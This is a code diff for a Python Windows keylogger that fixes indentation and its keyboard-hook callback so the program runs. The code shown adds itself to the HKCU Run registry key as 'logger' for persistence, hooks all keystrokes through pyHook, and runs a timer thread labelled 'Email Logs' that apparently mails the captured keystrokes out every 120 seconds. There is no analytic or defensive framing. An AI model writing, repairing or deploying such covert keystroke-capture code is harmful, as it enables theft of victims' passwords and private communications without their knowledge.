@@ -18,18 +18,18 @@ count=0
 
 # Add to startup
 def addStartup():
-	if getattr(sys, 'frozen', False):
-		fp = os.path.dirname(os.path.realpath(sys.executable))
-	elif __file__:
-		fp = os.path.dirname(os.path.realpath(__file__))
-	file_name=sys.argv[0].split("\\")[-1]
-	new_file_path=fp+"\\"+file_name
-	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
+    if getattr(sys, 'frozen', False):
+	    fp = os.path.dirname(os.path.realpath(sys.executable))
+    elif __file__:
+	    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name=sys.argv[0].split("\\")[-1]
+    new_file_path=fp+"\\"+file_name
+    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-	key2change= OpenKey(HKEY_CURRENT_USER,
-	keyVal,0,KEY_ALL_ACCESS)
+    key2change= OpenKey(HKEY_CURRENT_USER,
+    keyVal,0,KEY_ALL_ACCESS)
 
-	SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
+    SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
 
 
 # Email Logs
@@ -65,9 +65,12 @@ class TimerClass(threading.Thread):
 		self.event.wait(120)
 			
 def main():
-	addStartup()
-	email=TimerClass()
-	email.start()
+    addStartup()
+    email=TimerClass()
+    email.start()
+	
+if __name__ == '__main__':
+    main()
 
 def keypressed(event):
     global x,data
@@ -83,9 +86,6 @@ def keypressed(event):
 	data=data+keys 
 
 obj = pyHook.HookManager()
-obj.KeyDown = keypressed()
+obj.KeyDown = keypressed
 obj.HookKeyboard()
 pythoncom.PumpMessages()
-
-if __name__ == '__main__':
-    main()
